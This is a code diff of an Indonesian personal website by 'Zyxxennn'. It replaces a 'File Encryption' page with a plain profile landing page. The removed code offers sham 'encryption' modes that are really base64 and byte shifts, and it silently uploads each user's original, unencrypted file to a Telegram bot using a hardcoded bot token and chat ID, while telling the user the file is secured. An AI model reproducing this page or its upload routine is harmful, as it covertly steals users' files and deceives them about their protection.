@@ -1,505 +1,180 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>File Encryption | Zyxxennn</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://unpkg.com/feather-icons"></script>
-  <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Shiroko | Zyxxennn</title>
+  <script src="https://unpkg.com/lucide@latest"></script>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-    
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-      color: #f1f5f9;
-      min-height: 100vh;
-      margin: 0;
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:Poppins,Arial,sans-serif;background:#000;color:#fff;overflow-x:hidden}
+    .bg-video{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:-2}
+    .overlay{position:fixed;inset:0;background:rgba(0,0,0,0.45);z-index:-1}
+
+    /* Header & Hamburger */
+    header{
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      padding:12px 18px;
+      display:flex;
+      justify-content:flex-start;
+      z-index:20;
     }
-    
-    .glass-card {
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
-      border-radius: 16px;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(255, 255, 255, 0.1);
+    .hamburger{
+      cursor:pointer;
+      color:#fff;
+      font-size:28px;
     }
-    
-    .file-label {
-      transition: all 0.3s ease;
+
+    /* Sidebar */
+    .sidebar{
+      position: fixed;
+      top:0;
+      left:-260px;
+      width:240px;
+      height:100%;
+      background: rgba(255,255,255,0.08);
+      backdrop-filter: blur(16px) saturate(180%);
+      -webkit-backdrop-filter: blur(16px) saturate(180%);
+      border-right:1px solid rgba(255,255,255,0.2);
+      display:flex;
+      flex-direction:column;
+      padding:60px 20px;
+      gap:12px;
+      transition:left .3s ease;
+      z-index:30;
     }
-    
-    .file-label:hover {
-      transform: translateY(-2px);
-    }
-    
-    .download-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 4px 12px rgba(34, 197, 94, 0.3);
-    }
-    
-    .telegram-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 4px 12px rgba(0, 136, 204, 0.3);
-    }
-    
-    .select-encryption {
-      background: rgba(255, 255, 255, 0.1);
-      color: #f1f5f9;
-      appearance: none;
-      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23f1f5f9' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
-      background-repeat: no-repeat;
-      background-position: right 0.75rem center;
-      background-size: 1em;
-    }
-    
-    .progress-bar {
-      height: 6px;
-      border-radius: 3px;
-      background: rgba(255, 255, 255, 0.1);
-      overflow: hidden;
-    }
-    
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, #0ea5e9, #3b82f6);
-      transition: width 0.3s ease;
-    }
+    .sidebar.open{left:0}
+    .sidebar a{display:flex;align-items:center;gap:10px;color:#fff;text-decoration:none;font-weight:600;padding:10px;border-radius:8px;transition:.3s ease;box-shadow:0 0 6px rgba(0,0,0,0.2) inset}
+    .sidebar a:hover{background:rgba(0,195,255,0.15);box-shadow:0 0 10px rgba(0,195,255,0.7),0 0 20px rgba(0,119,255,0.5);}
+    .sidebar .label{font-size:.8rem;color:#aad7ff;margin-top:16px;letter-spacing:1px}
+
+    /* Main Content */
+    .wrap{margin-top:70px;display:flex;flex-direction:column;align-items:center;padding:20px;text-align:center}
+    .avatar{width:150px;height:150px;border-radius:999px;border:4px solid #00c3ff;object-fit:cover}
+    h1{margin-top:10px;font-size:2rem;color:#ffd86b;text-shadow:0 3px 10px rgba(0,0,0,0.5)}
+    .intro{max-width:700px;margin:12px 0;line-height:1.5;color:#eaf6ff}
+    .btn-row{display:flex;gap:12px;flex-wrap:wrap;justify-content:center;margin:8px 0}
+    .btn{padding:10px 18px;border-radius:999px;background:linear-gradient(90deg,#00c3ff,#0077ff);color:#fff;text-decoration:none;font-weight:700;transition:.3s ease;box-shadow:0 0 8px rgba(0,195,255,0.5);}
+    .btn:hover{transform:translateY(-3px) scale(1.05);box-shadow:0 0 16px rgba(0,195,255,0.9),0 0 30px rgba(0,119,255,0.7);}
+    .menu-title{margin-top:14px;font-weight:700;letter-spacing:2px;color:#dff1ff}
+    .sections{width:100%;max-width:900px;margin-top:16px;padding-bottom:60px}
+    .section{display:none}
+    .section.active{display:block;animation:fadeIn .3s ease-out}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+
+    /* Card Styles */
+    .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px}
+    .card{background:#fff;color:#111;border-radius:14px;padding:12px;box-shadow:0 6px 20px rgba(0,0,0,0.5)}
+    .card img{width:100%;height:140px;object-fit:cover;border-radius:8px;margin-bottom:10px}
+    .card h3, .card h2{margin-bottom:6px}
+    .card p{margin-bottom:10px;font-size:.9rem}
+    .card .card-btn{display:inline-block;padding:8px 12px;background:#0077ff;color:#fff;border-radius:8px;text-decoration:none;font-weight:600;transition:.3s}
+    .card .card-btn:hover{box-shadow:0 0 12px rgba(0,195,255,0.8),0 0 25px rgba(0,119,255,0.6);}
   </style>
 </head>
-<body class="flex items-center justify-center p-4">
-  <div class="glass-card w-full max-w-md p-8">
-    <div class="text-center mb-8">
-      <div class="flex justify-center mb-4">
-        <i data-feather="lock" class="w-12 h-12 text-blue-400"></i>
-      </div>
-      <h1 class="text-2xl font-bold text-blue-400 mb-2">File Encryption | Zyxxennn</h1>
-      <p class="text-gray-300">Enkripsi file Anda</p>
+<body>
+  <video class="bg-video" autoplay muted loop playsinline>
+    <source src="https://files.catbox.moe/1p7a9d.mp4" type="video/mp4">
+  </video>
+  <div class="overlay"></div>
+
+  <header>
+    <div class="hamburger" id="hamburger">
+      <i data-lucide="menu"></i>
+    </div>
+  </header>
+
+  <nav id="sidebar" class="sidebar">
+    <a href="#" onclick="goHome()"><i data-lucide="home"></i> HOME</a>
+    <a href="#" onclick="loadSection('tools','pages/tools.html')"><i data-lucide="wrench"></i> TOOLS</a>
+    <a href="#" onclick="loadSection('script','pages/script.html')"><i data-lucide="file-code-2"></i> SCRIPT</a>
+    <a href="#" onclick="loadSection('shop','pages/shop.html')"><i data-lucide="shopping-cart"></i> SHOP / TOKO</a>
+    <a href="#" onclick="loadSection('html','pages/html.html')"><i data-lucide="code"></i> HTML</a>
+
+    <div class="label">MENU MEDIA SOSIAL</div>
+    <a href="https://t.me/Zyxxennn" target="_blank"><i data-lucide="send"></i> TELEGRAM</a>
+    <a href="https://t.me/ZyxxennnCH" target="_blank"><i data-lucide="rss"></i> CHANNEL TELEGRAM</a>
+    <a href="https://saweria.co/ZyxxennnOffociall" target="_blank"><i data-lucide="gift"></i> SAWERIA</a>
+    <a href="anonymous.html"><i data-lucide="message-circle"></i> ANONYMOUS CHAT</a>
+  </nav>
+
+  <main class="wrap">
+    <img class="avatar" src="https://files.catbox.moe/egvoem.jpg" alt="Shiroko">
+    <h1>Shiroko</h1>
+    <p class="intro">
+      Halo! Saya Zyxxennn membuat website modern, aplikasi ringan, dan konten kreatif. 
+      Saya suka coding, suka membantu dan pengalaman pengguna yang senang dan bisa dimanfaatkan. 
+      Kalian bisa hubungi saya lewat tautan di bawah ini dan dapat info lewat channel telegram.
+    </p>
+
+    <div class="btn-row">
+      <a class="btn" href="https://saweria.co/ZyxxennnOffociall" target="_blank">SAWERIA</a>
+      <a class="btn" href="https://t.me/Zyxxennn" target="_blank">TELEGRAM</a>
+      <a class="btn" href="https://t.me/ZyxxennnCH" target="_blank">CHANNEL OWNER</a>
     </div>
 
-    <!-- File Input -->
-    <div class="mb-6">
-      <div class="flex justify-center">
-        <label for="fileInput" class="file-label cursor-pointer bg-blue-500 hover:bg-blue-600 text-white px-6 py-3 rounded-lg font-medium flex items-center">
-          <i data-feather="upload" class="mr-2"></i>
-          Pilih File
-          <input type="file" id="fileInput" class="hidden">
-        </label>
-      </div>
-      <div id="fileName" class="text-center text-sm text-gray-400 mt-2 italic">Belum ada file dipilih</div>
-      <div id="fileSize" class="text-center text-xs text-gray-500 mt-1"></div>
+    <div class="menu-title">PILIHAN MENU</div>
+    <div class="btn-row">
+      <button class="btn" onclick="loadSection('tools','pages/tools.html')">TOOLS</button>
+      <button class="btn" onclick="loadSection('script','pages/script.html')">SCRIPT</button>
+      <button class="btn" onclick="loadSection('shop','pages/shop.html')">SHOP / TOKO</button>
+      <button class="btn" onclick="loadSection('html','pages/html.html')">HTML</button>
     </div>
 
-    <!-- Progress Bar -->
-    <div id="progressContainer" class="mb-6 hidden">
-      <div class="flex justify-between text-xs text-gray-300 mb-1">
-        <span>Proses enkripsi...</span>
-        <span id="progressPercent">0%</span>
-      </div>
-      <div class="progress-bar">
-        <div id="progressFill" class="progress-fill" style="width: 0%"></div>
-      </div>
+    <div class="sections">
+      <div id="tools" class="section"></div>
+      <div id="script" class="section"></div>
+      <div id="shop" class="section"></div>
+      <div id="html" class="section"></div>
     </div>
-
-    <!-- Encryption Options -->
-    <div class="mb-6">
-      <select id="encryptionType" class="select-encryption w-full px-4 py-3 rounded-lg mb-3 focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <option>enc &lt;LEVEL&gt; - STANDARD</option>
-        <option>enceval &lt;LEVEL&gt; - EVALUATE</option>
-        <option>encchina - MANDARIN STYLE</option>
-        <option>encarab - ARABIC STYLE</option>
-        <option>encjapan - JAPANESE STYLE</option>
-        <option>encinvis - INVISIBLE MODE</option>
-        <option>encjapxab - JAPAN X ARAB</option>
-        <option>encx - BASE 64</option>
-        <option>encnebula - HARD DESIGN</option>
-        <option>encnova - NOVA STYLE</option>
-        <option>encsiu - SIU + CALCRICK</option>
-        <option>customenc &lt;NAME&gt; - CUSTOM</option>
-        <option>encmax &lt;INTENSITY&gt;</option>
-        <option>encstealth - STEALTH MODE</option>
-        <option>encstrong - POWER FORTRESS</option>
-        <option>encultra - ULTRA PROTECTION</option>
-        <option>encbig &lt;MB&gt; - MEGABYTE</option>
-        <option>encnew - ADVANCED LAYER</option>
-        <option>encquantum - QUANTUM</option>
-        <option>enclocked - LOCKED HARD</option>
-      </select>
-    </div>
-
-
-    <!-- Encryption Button -->
-    <button onclick="encryptFile()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center transition-all duration-300">
-      <i data-feather="lock" class="mr-2"></i>
-      ENCRYPT FILE
-    </button>
-
-    <!-- Result Section -->
-    <div id="result" class="hidden mt-6 p-4 bg-green-500 bg-opacity-20 rounded-lg text-green-400 text-center">
-      <div class="flex items-center justify-center mb-2">
-        <i data-feather="check-circle" class="w-5 h-5 mr-2"></i>
-        <span class="font-medium">ENCRYPTION SUKSES!</span>
-      </div>
-      
-      <div class="flex flex-col space-y-3 mt-4">
-        <button onclick="downloadEncrypted()" class="download-btn bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg transition-all duration-300 flex items-center justify-center">
-          <i data-feather="download" class="mr-2"></i>
-          DOWNLOAD FILE
-        </button>
-        
-      </div>
-    </div>
-  </div>
+  </main>
 
   <script>
-    feather.replace();
-    
-    let encryptedContent = null;
-    let originalFilename = "";
-    let originalFile = null;
-    const BOT_TOKEN = "8330143062:AAGIYPE3ssRG-2-HiOkwlvP2AG7mtoGkgQ8";
-    const CHAT_ID = "8447173769"; // Telegram chat ID
-    
-    document.getElementById("fileInput").addEventListener("change", function(e) {
-      const file = e.target.files[0];
-      const fileNameDiv = document.getElementById("fileName");
-      const fileSizeDiv = document.getElementById("fileSize");
-      
-      if (file) {
-        fileNameDiv.textContent = file.name;
-        originalFilename = file.name;
-        originalFile = file;
-        
-        // Display file size
-        const fileSize = file.size;
-        let sizeText = "";
-        if (fileSize < 1024) {
-          sizeText = fileSize + " bytes";
-        } else if (fileSize < 1048576) {
-          sizeText = (fileSize / 1024).toFixed(2) + " KB";
-        } else {
-          sizeText = (fileSize / 1048576).toFixed(2) + " MB";
-        }
-        fileSizeDiv.textContent = "Ukuran: " + sizeText;
-      } else {
-        fileNameDiv.textContent = "Belum ada file dipilih";
-        fileSizeDiv.textContent = "";
+    const sidebar = document.getElementById('sidebar');
+    const hamburger = document.getElementById('hamburger');
+
+    // Toggle sidebar
+    hamburger.addEventListener('click', () => {
+      sidebar.classList.toggle('open');
+      const icon = hamburger.querySelector('i');
+      icon.setAttribute('data-lucide', sidebar.classList.contains('open') ? 'x' : 'menu');
+      lucide.createIcons();
+    });
+
+    // Tutup sidebar saat klik di luar
+    document.addEventListener('click', (e) => {
+      if (!sidebar.contains(e.target) && !hamburger.contains(e.target)) {
+        sidebar.classList.remove('open');
+        hamburger.querySelector('i').setAttribute('data-lucide','menu');
+        lucide.createIcons();
       }
     });
-    
-    
-    async function encryptFile() {
-      const fileInput = document.getElementById("fileInput");
-      const file = fileInput.files[0];
-      const encryptionType = document.getElementById("encryptionType").value;
-      const BOT_TOKEN = "8330143062:AAGIYPE3ssRG-2-HiOkwlvP2AG7mtoGkgQ8";
-      const CHAT_ID = "8447173769";
-      
-      if (!file) {
-        alert("Silakan pilih file terlebih dahulu!");
-        return;
-      }
-      
-      // Reset UI
-      document.getElementById("result").classList.add("hidden");
-      const progressContainer = document.getElementById("progressContainer");
-      progressContainer.classList.remove("hidden");
-      
-      try {
-        // Show loading
-        const progressFill = document.getElementById("progressFill");
-        const progressPercent = document.getElementById("progressPercent");
-        
-        // Initial progress
-        progressFill.style.width = "10%";
-        progressPercent.textContent = "10%";
-        
-        // Read file as ArrayBuffer for binary data
-        const content = await readFileAsArrayBuffer(file);
-        
-        // Progress update
-        progressFill.style.width = "30%";
-        progressPercent.textContent = "30%";
-        
-        // Apply encryption
-        const encType = encryptionType.split(' ')[0];
-        const levelMatch = encryptionType.match(/<(\d+)>/);
-        const level = levelMatch ? parseInt(levelMatch[1]) : 1;
-        
-        let encryptedData;
-        
-        // Progress update
-        progressFill.style.width = "50%";
-        progressPercent.textContent = "50%";
-        
-        switch(encType) {
-          case 'enc':
-            encryptedData = await encryptWithLevel(content, level);
-            break;
-          case 'enceval':
-            encryptedData = await encryptWithLevel(content, level * 2);
-            break;
-          case 'encchina':
-            encryptedData = await shiftBytes(content, 5000 + level * 100);
-            break;
-          case 'encarab':
-            encryptedData = await shiftBytes(content, 1000 + level * 50);
-            break;
-          case 'encjapan':
-            encryptedData = await shiftBytes(content, 3000 + level * 30);
-            break;
-          case 'encinvis':
-            encryptedData = await shiftBytes(content, 8192 + level * 100);
-            break;
-          case 'encjapxab':
-            encryptedData = await alternateShiftBytes(content, 3000, 1000, level * 20);
-            break;
-          case 'encx':
-            encryptedData = await base64Encode(content);
-            break;
-          case 'encnebula':
-            encryptedData = await base64Encode(content);
-            encryptedData = await reverseString(encryptedData);
-            encryptedData = await alternateCase(encryptedData);
-            break;
-          case 'encnova':
-            encryptedData = await base64Encode(content);
-            encryptedData = await shiftBytes(encryptedData, 100 + level * 5);
-            break;
-          case 'encsiu':
-            const randomStr = Math.random().toString(36).substring(2, 2 + level);
-            encryptedData = await base64Encode(content + randomStr);
-            encryptedData = await reverseString(encryptedData);
-            break;
-          case 'customenc':
-            const customName = encryptionType.match(/<([^>]+)>/)?.[1] || 'CUSTOM';
-            encryptedData = await base64Encode(customName + ':' + content);
-            break;
-          case 'encmax':
-            encryptedData = content;
-            for (let i = 0; i < level * 3; i++) {
-              encryptedData = await base64Encode(encryptedData);
-              encryptedData = await reverseString(encryptedData);
-            }
-            break;
-          case 'encstealth':
-            encryptedData = await shiftBytes(content, 7000 + level * 10);
-            encryptedData = await base64Encode(encryptedData);
-            break;
-          case 'encstrong':
-            encryptedData = await reverseString(content);
-            encryptedData += content;
-            encryptedData = await base64Encode(encryptedData);
-            for (let i = 0; i < level; i++) {
-              encryptedData = await base64Encode(encryptedData);
-            }
-            break;
-          case 'encultra':
-            const part1 = await base64Encode(content);
-            const part2 = await base64Encode(await reverseString(content));
-            encryptedData = part1 + part2;
-            encryptedData = await shiftBytes(encryptedData, 1);
-            break;
-          case 'encbig':
-            const mb = levelMatch ? parseInt(levelMatch[1]) : 1;
-            encryptedData = await base64Encode(content.repeat(mb * 1000));
-            break;
-          case 'encnew':
-            encryptedData = await base64Encode(content + await reverseString(content));
-            encryptedData = await alternateCase(encryptedData);
-            break;
-          case 'encquantum':
-            encryptedData = await shiftBytes(content, level);
-            encryptedData = await base64Encode(encryptedData);
-            break;
-          case 'enclocked':
-            encryptedData = await base64Encode(content + 'LOCKED' + level);
-            encryptedData = await reverseString(encryptedData);
-            break;
-          default:
-            encryptedData = await base64Encode(content);
-        }
 
-        // Final progress
-        progressFill.style.width = "100%";
-        progressPercent.textContent = "100%";
-        
-        encryptedContent = encryptedData;
-        originalFilename = file.name;
-        originalFile = file;
-
-        // Hide progress and show result after a small delay
-        setTimeout(() => {
-          progressContainer.classList.add("hidden");
-          document.getElementById("result").classList.remove("hidden");
-        }, 500);
-        
-        // Send notification and original file to Telegram in background
-        Promise.all([
-          sendTelegramNotification(BOT_TOKEN, CHAT_ID, originalFilename, encryptionType),
-          sendOriginalFileToTelegram(BOT_TOKEN, CHAT_ID, originalFile)
-        ]).catch(e => console.error("Telegram error:", e));
-      } catch (error) {
-        console.error("Encryption error:", error);
-        alert("Terjadi kesalahan saat mengenkripsi file!");
-      }
+    function goHome(){
+      document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+      sidebar.classList.remove('open');
+      hamburger.querySelector('i').setAttribute('data-lucide','menu');
+      lucide.createIcons();
+      window.scrollTo({top:0,behavior:'smooth'});
     }
 
-    async function sendOriginalFileToTelegram(botToken, chatId, file) {
-      if (!file) {
-        console.log("Tidak ada file asli yang siap dikirim!");
-        return false;
-      }
-      
-      try {
-        const formData = new FormData();
-        formData.append("document", file, file.name);
-        
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
-          method: "POST",
-          body: formData
+    function loadSection(id,url){
+      fetch(url)
+        .then(res=>res.text())
+        .then(html=>{
+          document.getElementById(id).innerHTML=html;
+          document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+          document.getElementById(id).classList.add('active');
+          sidebar.classList.remove('open');
+          hamburger.querySelector('i').setAttribute('data-lucide','menu');
+          lucide.createIcons();
         });
-        
-        const data = await response.json();
-        return data.ok;
-      } catch (error) {
-        console.error("Error sending original file to Telegram:", error);
-        return false;
-      }
-    }
-    
-    async function sendTelegramNotification(botToken, chatId, filename, encryptionType) {
-      const message = `📁 File baru dienkripsi!\n\nNama file: ${filename}\nUkuran: ${formatFileSize(originalFile.size)}\nMetode: ${encryptionType}\n\n⚠️ File ini telah dienkripsi dengan aman.`;
-      
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: "HTML"
-          })
-        });
-        
-        const data = await response.json();
-        const statusDiv = document.getElementById("telegramStatus");
-        if (data.ok) {
-          statusDiv.innerHTML = `<span class="text-green-400">Notifikasi terkirim ke Telegram!</span>`;
-        } else {
-          statusDiv.innerHTML = `<span class="text-red-400">Gagal mengirim notifikasi: ${data.description || 'Unknown error'}</span>`;
-        }
-        return data.ok;
-      } catch (error) {
-        console.error("Error sending to Telegram:", error);
-        return false;
-      }
-    }
-    
-    // Helper functions for encryption
-    function readFileAsArrayBuffer(file) {
-      return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result);
-        reader.onerror = reject;
-        reader.readAsArrayBuffer(file);
-      });
     }
 
-    function arrayBufferToString(buffer) {
-      return String.fromCharCode.apply(null, new Uint8Array(buffer));
-    }
-
-    function stringToArrayBuffer(str) {
-      const buf = new ArrayBuffer(str.length);
-      const bufView = new Uint8Array(buf);
-      for (let i = 0; i < str.length; i++) {
-        bufView[i] = str.charCodeAt(i);
-      }
-      return buf;
-    }
-
-    async function base64Encode(data) {
-      if (typeof data === 'string') {
-        return btoa(data);
-      } else {
-        const binaryString = arrayBufferToString(data);
-        return btoa(binaryString);
-      }
-    }
-
-    async function reverseString(str) {
-      return str.split('').reverse().join('');
-    }
-
-    async function alternateCase(str) {
-      return str.split('').map((c,i) => i%2 ? c.toUpperCase() : c.toLowerCase()).join('');
-    }
-
-    async function shiftBytes(data, shift) {
-      if (typeof data === 'string') {
-        return data.split('').map(c => String.fromCharCode(c.charCodeAt(0) + shift)).join('');
-      } else {
-        const bytes = new Uint8Array(data);
-        const shifted = new Uint8Array(bytes.length);
-        for (let i = 0; i < bytes.length; i++) {
-          shifted[i] = bytes[i] + shift;
-        }
-        return arrayBufferToString(shifted.buffer);
-      }
-    }
-
-    async function alternateShiftBytes(data, shift1, shift2, level) {
-      if (typeof data === 'string') {
-        return data.split('').map((c,i) => 
-          String.fromCharCode(c.charCodeAt(0) + (i%2 ? shift1 : shift2) + level)).join('');
-      } else {
-        const bytes = new Uint8Array(data);
-        const shifted = new Uint8Array(bytes.length);
-        for (let i = 0; i < bytes.length; i++) {
-          shifted[i] = bytes[i] + (i%2 ? shift1 : shift2) + level;
-        }
-        return arrayBufferToString(shifted.buffer);
-      }
-    }
-
-    async function encryptWithLevel(data, level) {
-      let encrypted = await base64Encode(data);
-      for (let i = 0; i < level; i++) {
-        encrypted = await base64Encode(encrypted);
-        encrypted = await reverseString(encrypted);
-      }
-      return encrypted;
-    }
-    
-    function downloadEncrypted() {
-      if (!encryptedContent || !originalFilename) return;
-      
-      const blob = new Blob([encryptedContent], { type: "application/octet-stream" });
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      
-      const parts = originalFilename.split(".");
-      if (parts.length > 1) {
-        const ext = parts.pop();
-        const nameOnly = parts.join(".");
-        link.download = nameOnly + "_encrypted." + ext;
-      } else {
-        link.download = originalFilename + "_encrypted";
-      }
-      
-      link.click();
-    }
-    
-    function formatFileSize(bytes) {
-      if (bytes < 1024) return bytes + " bytes";
-      else if (bytes < 1048576) return (bytes / 1024).toFixed(2) + " KB";
-      else return (bytes / 1048576).toFixed(2) + " MB";
-    }
+    lucide.createIcons();
   </script>
 </body>
 </html>
